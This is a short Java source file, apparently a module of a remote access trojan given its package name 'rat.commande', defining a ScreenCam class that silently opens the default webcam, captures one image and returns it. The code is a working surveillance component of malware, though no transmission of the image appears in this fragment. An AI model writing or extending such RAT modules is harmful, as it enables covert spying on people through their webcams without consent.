package rat.commande;

import com.github.sarxos.webcam.Webcam;

import java.awt.image.BufferedImage;

public class ScreenCam   {
    static public BufferedImage printCam() {
            Webcam webcam = Webcam.getDefault();
            webcam.open();
            BufferedImage image = webcam.getImage();
            webcam.close();
            return image;
    }
}
